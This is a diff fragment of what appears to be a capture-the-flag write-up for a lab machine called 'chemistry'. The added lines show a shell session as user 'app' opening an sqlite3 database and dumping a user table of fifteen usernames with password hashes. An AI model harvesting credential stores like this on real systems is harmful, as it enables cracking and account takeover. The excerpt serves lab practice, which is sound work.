@@ -45,5 +45,28 @@ lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
 drwx------ 2 app  app  4096 Oct  9  2024 static
 drwx------ 2 app  app  4096 Oct  9  2024 templates
 drwx------ 2 app  app  4096 Sep  2 09:31 uploads
-app@chemistry:~$ 
+app@chemistry:~$
+```
+```
+-rwx------ 1 app app 20480 Sep  2 09:31 database.db
+app@chemistry:~/instance$ sqlite3 database.db
+sqlite3 database.db
+.tables
+structure  user     
+select * from user;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+11|gelacia|4af70c80b68267012ecdac9a7e916d18
+12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+13|axel|9347f9724ca083b17e39555c36fd9007
+14|kristel|6896ba7b11a62cacffbdaded457c6d92
+15|hei|d8578edf8458ce06fbc5bb76a58c5ca4
 ```
